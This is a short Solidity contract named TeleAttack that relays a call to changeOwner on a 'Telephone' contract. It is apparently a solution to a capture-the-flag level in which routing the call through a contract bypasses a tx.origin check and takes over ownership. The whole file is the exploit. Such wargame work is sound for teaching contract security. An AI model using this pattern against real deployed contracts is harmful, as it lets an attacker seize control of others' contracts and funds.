pragma solidity ^0.8.0;
interface Telephone {
    function changeOwner(address _owner) external;
}
contract TeleAttack {
    function AttackCall(address _TelephoneAddress, address _owner) external {
        Telephone(_TelephoneAddress).changeOwner(_owner);
    }
}